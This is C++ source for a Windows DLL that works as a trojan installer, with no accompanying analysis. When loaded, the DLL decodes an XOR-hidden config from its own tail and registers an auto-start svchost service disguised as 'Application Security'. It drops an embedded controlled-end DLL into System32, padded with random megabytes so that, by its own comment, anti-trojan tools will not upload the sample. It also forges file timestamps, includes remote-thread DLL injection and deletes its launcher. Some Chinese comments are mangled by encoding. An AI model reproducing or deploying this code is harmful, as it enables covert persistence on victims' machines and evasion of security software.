// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"

#include <winsvc.h>
#include <windows.h>
#include <tlhelp32.h>
#include <time.h>
#include "MainCtrl.h"
#include "macro.h"

#define DEFAULT_SERVICE     "Application Security"
#define MY_SERVICE_DESCRIPTION "��Ӧ�ó�������ʱ���Ӧ�ó���İ�ȫ��"

HMODULE hDll = NULL;

union client_cfg gCFG;

BOOL LoadCFG()
{
	char selfFile[MAX_PATH] = {0};
	do
	{
		//���首先读取配置信息（位于PE文件的最后）
		if(GetModuleFileNameA(hDll, selfFile, MAX_PATH) == 0)
			return FALSE;
		
		FILE* fp = fopen(selfFile, "rb");
		if(fp == NULL)	break;
		if(fseek(fp , 0 - sizeof(gCFG) , SEEK_END))
		{
			fclose(fp);
			return FALSE;
		}
		fread(&gCFG, sizeof(gCFG) , 1, fp);
		fclose(fp);

		//是否为合法的配置信息
		if(memcmp(&gCFG, CFG_MAGIC, 8) != 0)
			return FALSE;

		//将配置信息解�?
		unsigned char* pp = (unsigned char*)&gCFG;
		for (int i = sizeof(CFG_MAGIC); i < sizeof(gCFG.cfg1); i++)
			pp[i] ^= 0xFF;
	}while(0);

	return TRUE;
}

BOOL ReleaseDll(char* dllFile, int uSize, char* servicename)
{
	DWORD dwWrite = 0;
	HANDLE hFile = NULL;
	int i;

	hFile = CreateFileA(dllFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,
		CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
		return FALSE;

	unsigned char* dllBuf = new unsigned char[MainCtrl_size];
	if(GetMainCtrlResouceData(dllBuf, MainCtrl_size, MainCtrl_source, sizeof(MainCtrl_source)) != 0)
	{
		delete []dllBuf;
		return FALSE;
	}

	//写入被控制端DLL
	WriteFile(hFile,dllBuf, MainCtrl_size, &dwWrite,NULL);

	//这里随机写入一些数据，使得木马文件体积增大到一定程度，这样反木马工�?不会上传样板
	srand(time(NULL));
	int patchSize = (rand() % 10 + 1) * 1024 * 1024;
	for(i = 0; i < patchSize; i++)
	{
		unsigned char bb[8] = {rand() % 256, rand() % 256, rand() % 256, rand() % 256,
			rand() % 256, rand() % 256, rand() % 256, rand() % 256};
		WriteFile(hFile,&bb, sizeof(bb), &dwWrite, NULL);
	}

	//将配置信息解�?写入配置信息	在应用程序启动时检查应用程序的安全�?
	if(servicename)	strncpy(gCFG.cfg1.inject, servicename,sizeof(gCFG.cfg1.inject)); 
	unsigned char* pp = (unsigned char*)&gCFG;
	for (i = sizeof(CFG_MAGIC); i < sizeof(gCFG.cfg1); i++)
		pp[i] ^= 0xFF;
	WriteFile(hFile, &gCFG, sizeof(gCFG), &dwWrite,NULL);

	FILETIME newFileTime;
	newFileTime.dwLowDateTime = 12345;
	newFileTime.dwHighDateTime = 29950000;
	SetFileTime(hFile, &newFileTime, &newFileTime, &newFileTime);
	
	delete []dllBuf;
	CloseHandle(hFile);
	return TRUE;
}


void StartService(const char* name)
{
	SC_HANDLE hSCManager = OpenSCManager( NULL, NULL,SC_MANAGER_CREATE_SERVICE );
	if ( NULL != hSCManager )
	{
		SC_HANDLE hService = OpenServiceA(hSCManager, name, DELETE | SERVICE_START);
		if ( NULL != hService )
		{
			StartService(hService, 0, NULL);
			CloseServiceHandle( hService );
		}
		CloseServiceHandle( hSCManager );
	}
}

int WriteRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,char* szData,DWORD dwData,int Mode)
{
	HKEY hKey; 
	DWORD dwDisposition;    
	int iResult =0;
	
	switch(Mode)		
	{			
	case 0:
		if(RegCreateKeyExA(MainKey,SubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,&dwDisposition) != ERROR_SUCCESS
			)
		{
			//KDebug("RegCreateKeyEx %d", GetLastError());
			goto leave;		 
		}
	case 1:	
		if(RegOpenKeyExA(MainKey,SubKey,0,KEY_READ|KEY_WRITE,&hKey) != ERROR_SUCCESS)					 
		{
			//KDebug("RegOpenKeyEx %d", GetLastError());
			goto leave;				 		 			
		}
		switch(Type)
		{		 
		case REG_SZ:		 
		case REG_EXPAND_SZ:			 			 
			if(RegSetValueExA(hKey,Vname,0,Type,(LPBYTE)szData,strlen(szData)+1) == ERROR_SUCCESS) 				 
				iResult =1;				 			
			//KDebug("RegSetValueEx %d", GetLastError());		   
			break;
	    case REG_DWORD:
            if(RegSetValueExA(hKey,Vname,0,Type,(LPBYTE)szData,sizeof(DWORD)) == ERROR_SUCCESS)  
	            iResult =1;				 			 
			//KDebug("RegSetValueEx %d", GetLastError());		   
			break;
	    case REG_BINARY:
		    break;
		}
		break;				
	case 2:
        if(RegOpenKeyEx(MainKey,SubKey,NULL,KEY_READ|KEY_WRITE,&hKey) != ERROR_SUCCESS)				
			goto leave;		        
		if (RegDeleteKey(hKey,Vname) == ERROR_SUCCESS)		        
			iResult =1;
		break;		
	case 3:
        if(RegOpenKeyEx(MainKey,SubKey,NULL,KEY_READ|KEY_WRITE,&hKey) != ERROR_SUCCESS)				
			goto leave;		   
		if (RegDeleteValue(hKey,Vname) == ERROR_SUCCESS)		        
			iResult =1;
		break;
	}

leave:
	RegCloseKey(MainKey);		
	RegCloseKey(hKey);
	return iResult;
}

char *AddsvchostService()
{
	char *lpServiceName = NULL;
	int rc = 0;
	HKEY hkRoot;
    char buff[2048];
    //query svchost setting
    char *ptr, *pSvchost = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost";
    rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, pSvchost, 0, KEY_ALL_ACCESS, &hkRoot);
    if(ERROR_SUCCESS != rc)
        return NULL;
	
    DWORD type, size = sizeof buff;
    rc = RegQueryValueEx(hkRoot, "netsvcs", 0, &type, (unsigned char*)buff, &size);
    SetLastError(rc);
    if(ERROR_SUCCESS != rc)
        RegCloseKey(hkRoot);
	
	int i = 0;
	bool bExist = false;
	char servicename[50];
	do
	{	
		wsprintf(servicename, "netsvcs_0x%d", i);
		for(ptr = buff; *ptr; ptr = strchr(ptr, 0)+1)
		{
			if (lstrcmpi(ptr, servicename) == 0)
			{	
				bExist = true;
				break;
			}
		}
		if (bExist == false)
			break;
		bExist = false;
		i++;
	} while(1);
	
	servicename[lstrlen(servicename) + 1] = '\0';
	memcpy(buff + size - 1, servicename, lstrlen(servicename) + 2);
	
    rc = RegSetValueEx(hkRoot, "netsvcs", 0, REG_MULTI_SZ, (unsigned char*)buff, size + lstrlen(servicename) + 1);
	
	RegCloseKey(hkRoot);
	
    SetLastError(rc);
	
	if (bExist == false)
	{
		lpServiceName = new char[lstrlen(servicename) + 1];
		lstrcpy(lpServiceName, servicename);
	}
	
	return lpServiceName;
}

#ifndef INVALID_FILE_ATTRIBUTES
#define INVALID_FILE_ATTRIBUTES ((DWORD)-1)
#endif

char *InstallService2(LPCTSTR lpServiceDisplayName, LPCTSTR lpServiceDescription, char* strModulePath)
{
    char *lpServiceName = NULL;
    int rc = 0;
    HKEY hkRoot = HKEY_LOCAL_MACHINE, hkParam = 0;
    SC_HANDLE hscm = NULL, schService = NULL;
	char	strSysDir[MAX_PATH];
	DWORD	dwStartType = 0;
   
    //查询Svchost都有哪些服务
	char strSubKey[1024];
    char *ptr, *pSvchost = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost";
    rc = RegOpenKeyExA(hkRoot, pSvchost, 0, KEY_QUERY_VALUE, &hkRoot);
    if(ERROR_SUCCESS != rc)	return NULL;

    DWORD type, size = sizeof strSubKey;
    rc = RegQueryValueExA(hkRoot, "netsvcs", 0, &type, (unsigned char*)strSubKey, &size);
    RegCloseKey(hkRoot);
    SetLastError(rc);
    if(ERROR_SUCCESS != rc)	return NULL;

    //install service
    hscm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hscm == NULL) return NULL;

	GetSystemDirectoryA(strSysDir, sizeof(strSysDir));
	char *bin = "%SystemRoot%\\System32\\svchost.exe -k netsvcs";
	char strRegKey[1024];

    for(ptr = strSubKey; *ptr; ptr = strchr(ptr, 0)+1)
    {
		//////////////////////////////////////////////////////////////////////////
		char temp[500];
		wsprintf(temp, "SYSTEM\\CurrentControlSet\\Services\\%s", ptr);
		//KDebug(temp);

		rc = RegOpenKeyExA(HKEY_LOCAL_MACHINE, temp, 0, KEY_QUERY_VALUE, &hkRoot);
		if (rc == ERROR_SUCCESS)
		{
			RegCloseKey(hkRoot);
			continue;
		}

		//memset(strModulePath, 0, sizeof(strModulePath));
		wsprintf(strModulePath, "%s\\%sex.dll", strSysDir, ptr);
		DeleteFileA(strModulePath);
		
		if (GetFileAttributesA(strModulePath) != INVALID_FILE_ATTRIBUTES)
			continue;

		wsprintf(strRegKey, "MACHINE\\SYSTEM\\CurrentControlSet\\Services\\%s", ptr);

		schService = CreateServiceA(
			hscm,                       // SCManager database
			ptr,                    // name of service
			lpServiceDisplayName,          // service name to display
			SERVICE_ALL_ACCESS,        // desired access
			SERVICE_WIN32_SHARE_PROCESS,
			SERVICE_AUTO_START,      // start type
			SERVICE_ERROR_NORMAL,      // error control type
			bin,        // service's binary
			NULL,                      // no load ordering group
			NULL,                      // no tag identifier
			NULL,                      // no dependencies
			NULL,                      // LocalSystem account
			NULL);                     // no password
		
		if (schService != NULL)
			break;
	}

	if (schService == NULL)
	{
		lpServiceName = AddsvchostService();
		//memset(strModulePath, 0, sizeof(strModulePath));
		wsprintf(strModulePath, "%s\\%sex.dll", strSysDir, lpServiceName);

		wsprintf(strRegKey, "MACHINE\\SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
		schService = CreateServiceA(
			hscm,                      // SCManager database
			lpServiceName,                    // name of service
			lpServiceDisplayName,           // service name to display
			SERVICE_ALL_ACCESS,        // desired access
			SERVICE_WIN32_OWN_PROCESS,
			SERVICE_AUTO_START,      // start type
			SERVICE_ERROR_NORMAL,      // error control type
			bin,        // service's binary
			NULL,                      // no load ordering group
			NULL,                      // no tag identifier
			NULL,                      // no dependencies
			NULL,                      // LocalSystem account
			NULL);                     // no password
		dwStartType = SERVICE_WIN32_OWN_PROCESS;
	}
	else
	{
		dwStartType = SERVICE_WIN32_SHARE_PROCESS;
		lpServiceName = new char[lstrlen(ptr) + 1];
		lstrcpy(lpServiceName, ptr);
	}
	if (schService == NULL)	return NULL;

    CloseServiceHandle(schService);
    CloseServiceHandle(hscm);

    //config service
    hkRoot = HKEY_LOCAL_MACHINE;
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);

	if (dwStartType == SERVICE_WIN32_SHARE_PROCESS)
	{		
		DWORD dwServiceType = 0x120;
		WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Type", REG_DWORD, (char *)&dwServiceType, sizeof(DWORD), 0);
	}

	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Description", REG_SZ, (char *)lpServiceDescription, lstrlen(lpServiceDescription), 0);

	lstrcat(strSubKey, "\\Parameters");
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "ServiceDll", REG_EXPAND_SZ, (char *)strModulePath, lstrlen(strModulePath), 0);
 
    RegCloseKey(hkRoot);
    RegCloseKey(hkParam);
    CloseServiceHandle(schService);
    CloseServiceHandle(hscm);

    return lpServiceName;
}

DWORD FindProcess(const wchar_t* lpszProName)
{
	BOOL bMore = FALSE;  
	HANDLE hSnap = NULL;  
	DWORD dwPID = 0;  
	PROCESSENTRY32W pe32;  
	pe32.dwSize = sizeof(pe32);  

	hSnap =CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if(hSnap == INVALID_HANDLE_VALUE)  return -1;

	bMore = Process32FirstW(hSnap, &pe32);
	while(bMore)
	{
		if(wcsicmp(pe32.szExeFile, lpszProName)==0)
		{
			dwPID=pe32.th32ProcessID;
			break;
		}
		bMore = Process32NextW(hSnap, &pe32);
	}
	
	CloseHandle(hSnap);
	return dwPID;
}

BOOL RemoteLoadLibrary(DWORD dwPID,LPCSTR lpszDll)
{
	DWORD dwSize,dwWritten;
	DWORD dwID=0;
	HANDLE hThread=NULL;
	LPVOID pFun=NULL;

	HANDLE hPro=NULL;
	LPVOID lpBuf=NULL;
	hPro=OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, dwPID);
	dwSize=lstrlenA(lpszDll)+1;
	lpBuf=VirtualAllocEx(hPro, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
	if(NULL==lpBuf)
	{
		CloseHandle(hPro);
		return FALSE;
	}
	
	if(WriteProcessMemory(hPro,lpBuf,(LPVOID)lpszDll,dwSize,&dwWritten))
	{
		if(dwWritten!=dwSize)
		{
			VirtualFree(lpBuf,dwSize,MEM_DECOMMIT);
			CloseHandle(hPro);
			return FALSE;
		}
	}
	else
	{
		CloseHandle(hPro);
		return FALSE;
	}

	pFun=LoadLibraryA;
	hThread=CreateRemoteThread(hPro, NULL, 0, (LPTHREAD_START_ROUTINE)pFun,  lpBuf,  0, &dwID);
	
	WaitForSingleObject(hThread,INFINITE );
	CloseHandle(hThread);
	CloseHandle(hPro); 
	return TRUE;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		hDll = hModule;

		int argc =0;
		wchar_t **argv = CommandLineToArgvW(GetCommandLineW(),&argc);
		wchar_t *szProc = argv[1];
		wchar_t *szCmd = argv[2];
		wchar_t *szDir = argv[3];

		LoadCFG();

		{
			char strModulePath[MAX_PATH] = {0};
			char* lpServiceName = InstallService2(DEFAULT_SERVICE, MY_SERVICE_DESCRIPTION, strModulePath);

			if (lpServiceName != NULL)
			{
				//char	strSelf[MAX_PATH];
				//char	strSubKey[1024];
				//char inject[MAX_PATH] = {0};
				//memset(strSelf, 0, sizeof(strSelf));
				//GetModuleFileName(NULL, strSelf, sizeof(strSelf));
				//wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", DEFAULT_SERVICE);
				//WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "InstallModule", REG_SZ, strSelf, lstrlen(strSelf), 0);
		 
				KDebug("%s %s", lpServiceName, strModulePath);
				ReleaseDll(strModulePath, MAX_PATH, lpServiceName);

				StartService(lpServiceName);				
			}
		}

		if(argc >= 3)
		{
			Sleep(8000);

			//自己删除EXE文件
			DeleteFileW(szProc);

			ExitProcess(-69);
		}
	}
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}